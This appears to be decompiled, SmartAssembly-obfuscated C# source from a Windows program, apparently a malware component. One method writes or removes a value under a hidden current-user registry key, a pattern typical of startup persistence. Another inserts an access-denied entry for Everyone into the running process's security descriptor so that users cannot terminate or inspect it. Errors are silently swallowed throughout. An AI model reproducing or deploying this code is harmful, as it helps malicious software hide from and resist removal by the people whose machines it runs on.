using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GlIxuPPoosXGy;

internal sealed class TuehKGaxKRoptUmJ
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr hwtELkVWudzF, int YGYodHUFFc, [Out] byte[] BmebsFBRcKySwZ, uint UlVJKidXcUFsVfF, out uint mgaDJnOnPALhg);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr PPjUAAZrCi, int sLWCRyazEE, [In] byte[] VDZHKGTKKYZ);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void HZUqiVpDiYc(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107405321));
			if (bool_0 && registryKey.GetValue(getString_0(107405276)) != null)
			{
				registryKey.DeleteValue(getString_0(107405276));
			}
			else
			{
				registryKey.SetValue(getString_0(107405276), getString_0(107408019));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor PzZuNKWiRgqX(IntPtr intptr_0)
	{
		byte[] bmebsFBRcKySwZ = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, bmebsFBRcKySwZ, 0u, out var mgaDJnOnPALhg);
		if ((long)mgaDJnOnPALhg > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, bmebsFBRcKySwZ = new byte[mgaDJnOnPALhg], mgaDJnOnPALhg, out mgaDJnOnPALhg))
		{
			return null;
		}
		return new RawSecurityDescriptor(bmebsFBRcKySwZ, 0);
	}

	private void JBbenmvEuY(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void gyShNpOHOyS()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = PzZuNKWiRgqX(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			JBbenmvEuY(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static TuehKGaxKRoptUmJ()
	{
		Strings.CreateGetStringDelegate(typeof(TuehKGaxKRoptUmJ));
	}
}
